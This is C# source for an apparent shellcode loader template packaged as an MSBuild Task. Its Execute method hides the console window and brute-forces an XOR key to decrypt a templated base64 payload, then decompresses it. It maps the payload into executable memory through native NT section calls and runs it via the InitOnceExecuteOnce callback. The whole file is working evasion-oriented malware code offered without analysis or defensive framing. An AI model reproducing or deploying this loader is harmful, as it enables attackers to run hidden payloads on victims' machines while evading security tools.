using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Diagnostics;
using Microsoft.CSharp;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Security.Cryptography;

public class ClassRunner : Task, ITask
{
    [StructLayout(LayoutKind.Sequential)]
    public struct SECT_DATA
    {
        public Boolean isvalid;
        public IntPtr hSection;
        public IntPtr pBase;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct INIT_ONCE
    {
        private readonly IntPtr ptr;
        public static readonly INIT_ONCE INIT_ONCE_STATIC_INIT = new INIT_ONCE();
    }

    [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
    private delegate Int32 Initialize();

    public override bool Execute()
    {
        ShowWindow(GetConsoleWindow(), 0);

        byte[] encShellcode = Convert.FromBase64String("{{.Payload}}");
        byte[] rawShellcode = { };
        byte[] key = { {{.Key}} };
        byte[] realHash = { {{.Hash}} };

        bool found = false;
        while (!found) {
            key = increase(key, 1);
            rawShellcode = xor(encShellcode, key);
            SHA256 sha256Hash = SHA256.Create();
            byte[] testHash = sha256Hash.ComputeHash(rawShellcode);
            found = compare(realHash, testHash);
        }
        rawShellcode = Gzip.Decompress(rawShellcode);

        // Create local section, map two views RW + RX, copy shellcode to RW
        Console.WriteLine("\n[>] Creating local section..");
        SECT_DATA LocalSect = MapLocalSectionAndWrite(rawShellcode);

        Console.WriteLine("\n[>] Triggering shellcode using InitOnceExecuteOnce!");
        //Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
        //del();
        INIT_ONCE gInitOnce = new INIT_ONCE();
        IntPtr ctx;
        InitOnceExecuteOnce(ref gInitOnce, LocalSect.pBase, IntPtr.Zero, out ctx);

        return true;
    }

    static byte[] xor(byte[] data, byte[] key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; ++i)
        {
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        }
        return result;
    }

    public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
    {
        SECT_DATA SectData = new SECT_DATA();
        long ScSize = ShellCode.Length;
        long MaxSize = ScSize;
        IntPtr hSection = IntPtr.Zero;
        UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
        if (CallResult == 0 && hSection != IntPtr.Zero)
        {
            //Console.WriteLine("    |-> hSection: 0x" + String.Format("{0:X}", (hSection).ToInt64()));
            //Console.WriteLine("    |-> Size: " + ScSize);
            SectData.hSection = hSection;
        }
        else
        {
            //Console.WriteLine("[!] Failed to create section..");
            SectData.isvalid = false;
            return SectData;
        }

        // Allocate RW portion + Copy ShellCode
        IntPtr pScBase = IntPtr.Zero;
        long lSecOffset = 0;
        CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x04);
        if (CallResult == 0 && pScBase != IntPtr.Zero)
        {
            //Console.WriteLine("\n[>] Creating first view with PAGE_READWRITE");
            //Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
            SectData.pBase = pScBase;
        }
        else
        {
            //Console.WriteLine("[!] Failed to map section locally..");
            SectData.isvalid = false;
            return SectData;
        }

        Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);

        // Allocate ER portion
        IntPtr pScBase2 = IntPtr.Zero;
        CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
        if (CallResult == 0 && pScBase != IntPtr.Zero)
        {
            //Console.WriteLine("\n[>] Creating second view with PAGE_EXECUTE_READ");
            //Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase2).ToInt64()));
            SectData.pBase = pScBase2;
        }
        else
        {
            //Console.WriteLine("[!] Failed to map section locally..");
            SectData.isvalid = false;
            return SectData;
        }

        SectData.isvalid = true;
        return SectData;
    }

    static byte[] increase(byte[] Counter, int Count)
    {
        int carry = 0;
        byte[] buffer = new byte[Counter.Length];
        int offset = buffer.Length - 1;
        byte[] cnt = BitConverter.GetBytes(Count);
        byte osrc, odst, ndst;
    
        Buffer.BlockCopy(Counter, 0, buffer, 0, Counter.Length);
    
        for (int i = offset; i > 0; i--)
        {
            odst = buffer[i];
            osrc = offset - i < cnt.Length ? cnt[offset - i] : (byte)0;
            ndst = (byte)(odst + osrc + carry);
            carry = ndst < odst ? 1 : 0;
            buffer[i] = ndst;
        }
    
        return buffer;
    }

    static bool compare(byte[] a1, byte[] a2)
    {
        if (a1.Length != a2.Length) {
            return false;
        }
            
        for (int i=0; i<a1.Length; i++) {
            if (a1[i] != a2[i]) {
                return false;
            }
        }

        return true;
    }

    [DllImport("User32")]
    private static extern int ShowWindow(
        IntPtr hwnd, 
        int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtCreateSection(
        ref IntPtr section,
        UInt32 desiredAccess,
        IntPtr pAttrs,
        ref long MaxSize,
        uint pageProt,
        uint allocationAttribs,
        IntPtr hFile);

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtMapViewOfSection(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        IntPtr CommitSize,
        ref long SectionOffset,
        ref long ViewSize,
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect);

    [DllImport("kernel32")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool InitOnceExecuteOnce(
        ref INIT_ONCE InitOnce,
        IntPtr functionCallback,
        IntPtr Parameter,
        out IntPtr Context);

}

public static class Extensions
{
    public static T[] SubArray<T>(this T[] array, int offset, int length)
    {
        T[] result = new T[length];
        Array.Copy(array, offset, result, 0, length);
        return result;
    }
}
class Gzip
{
    public static byte[] Decompress(byte[] inputBytes)
    {
        try
        {
            using (var inputStream = new MemoryStream(inputBytes))
            using (var gZipStream = new GZipStream(inputStream, CompressionMode.Decompress))
            using (var outputStream = new MemoryStream())
            {
                gZipStream.CopyTo(outputStream);
                return outputStream.ToArray();
            }
        }
        catch
        {
            return null;
        }
    }
}